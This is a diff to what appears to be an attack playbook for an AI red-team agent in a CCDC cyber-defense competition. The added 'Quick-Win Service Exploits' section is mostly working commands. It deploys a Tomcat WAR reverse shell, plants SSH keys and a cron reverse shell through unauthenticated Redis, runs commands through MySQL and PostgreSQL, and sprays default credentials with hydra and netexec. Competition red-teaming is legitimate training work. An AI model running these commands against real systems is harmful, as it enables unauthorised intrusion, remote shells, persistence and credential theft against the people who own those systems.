@@ -27,6 +27,93 @@ Your attack recommendations should always be ranked by two axes: probability of 
 
 Credential attacks are the most reliable initial access vector in CCDC. Blue teams are expected to change default passwords, but they rarely change all of them in the first few minutes, and password policies are often weak.
 
+## Quick-Win Service Exploits
+
+These are the 30-second checks that yield immediate access on common CCDC services. Run these against every target in Phase 1 before moving to more complex attacks.
+
+### Tomcat Manager (Port 8080, 8443, or 80)
+
+Tomcat Manager is present in nearly every CCDC that includes a Java application server. Default credentials are almost never changed in the first 10 minutes. Check for the manager interface:
+
+```
+curl -s http://<target>:8080/manager/html -u tomcat:tomcat -o /dev/null -w "%{http_code}"
+```
+
+Common Tomcat default credentials to try (in order of likelihood): tomcat/tomcat, tomcat/s3cret, admin/admin, manager/manager, admin/tomcat, tomcat/changethis, admin/password, role1/tomcat. If any of these return HTTP 200 instead of 401, you have manager access and can deploy a WAR file for RCE:
+
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<jumpbox-IP> LPORT=4444 -f war -o shell.war
+curl -u tomcat:tomcat -T shell.war "http://<target>:8080/manager/text/deploy?path=/shell"
+curl http://<target>:8080/shell/
+```
+
+### FTP Anonymous Access (Port 21)
+
+Check every FTP server for anonymous login:
+
+```
+ftp -n <target> << 'EOF'
+user anonymous anonymous@
+ls
+bye
+EOF
+```
+
+Or more concisely with curl:
+```
+curl -s ftp://<target>/ --user anonymous:anonymous
+```
+
+If anonymous access is available and writable, you can upload web shells to web-accessible directories or upload SSH keys to .ssh directories.
+
+### Redis Without Authentication (Port 6379)
+
+Redis running without a password is an immediate RCE vector. Check for unauthenticated access:
+
+```
+redis-cli -h <target> INFO server
+```
+
+If this returns server information, you have full access. For RCE via SSH key injection:
+
+```
+redis-cli -h <target> -x SET crackit < ~/.ssh/ccdc-persist.pub
+redis-cli -h <target> CONFIG SET dir /root/.ssh/
+redis-cli -h <target> CONFIG SET dbfilename "authorized_keys"
+redis-cli -h <target> SAVE
+```
+
+For RCE via cron (if Redis runs as root):
+```
+redis-cli -h <target> SET crackit "\n\n*/1 * * * * bash -i >& /dev/tcp/<jumpbox-IP>/4444 0>&1\n\n"
+redis-cli -h <target> CONFIG SET dir /var/spool/cron/crontabs/
+redis-cli -h <target> CONFIG SET dbfilename root
+redis-cli -h <target> SAVE
+```
+
+### SNMP Write Access (Port 161/UDP)
+
+If RECON-001 found SNMP with write-capable community strings, SNMP can execute commands through the NET-SNMP extend mechanism. This is an advanced vector — check with RECON-001 for SNMP findings before attempting.
+
+### MySQL Without Password (Port 3306)
+
+```
+mysql -h <target> -u root --connect-timeout=5 -e "SELECT user,host FROM mysql.user;" 2>/dev/null
+```
+
+If this returns results, you have root access to MySQL. From there: read the web application's config for additional credentials, write a web shell via SELECT INTO OUTFILE, or use UDF for system command execution.
+
+### PostgreSQL Default Credentials (Port 5432)
+
+```
+psql -h <target> -U postgres -c "\du" 2>/dev/null
+```
+
+If this connects, check for command execution capability:
+```
+psql -h <target> -U postgres -c "COPY (SELECT 'id') TO PROGRAM 'id';"
+```
+
 ### Default Credential Spraying
 
 Start every engagement with a default credential spray. The critical insight is to spray widely and quickly — hit every target with a small list of common passwords rather than brute-forcing one target with a large list. This maximizes the chance of catching unchanged defaults before the blue team rotates them.
@@ -42,8 +129,8 @@ netexec smb <subnet>/24 -u Administrator -p 'Winter2025!' --continue-on-success
 
 For SSH/Linux targets:
 ```
-hydra -l root -P /usr/share/wordlists/ccdc-defaults.txt ssh://<target> -t 4 -f
-hydra -l admin -P /usr/share/wordlists/ccdc-defaults.txt ssh://<target> -t 4 -f
+hydra -l root -P /tmp/ccdc-wordlist.txt ssh://<target> -t 4 -f
+hydra -l admin -P /tmp/ccdc-wordlist.txt ssh://<target> -t 4 -f
 ```
 
 For RDP:
@@ -53,7 +140,7 @@ netexec rdp <subnet>/24 -u Administrator -p 'Password1!' --continue-on-success
 
 For web application logins (WordPress, phpMyAdmin, Roundcube):
 ```
-hydra -l admin -P /usr/share/wordlists/ccdc-defaults.txt <target> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect" -t 4 -f
+hydra -l admin -P /tmp/ccdc-wordlist.txt <target> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect" -t 4 -f
 ```
 
 Create a competition-specific wordlist before the event begins. Include common patterns: SeasonYear (Spring2026, Winter2025), CompetitionName+Year (WRCCDC2026, CCDC2026), and variations with special characters (P@ssw0rd!, Adm1n2026!). Many blue teams follow predictable password change patterns.
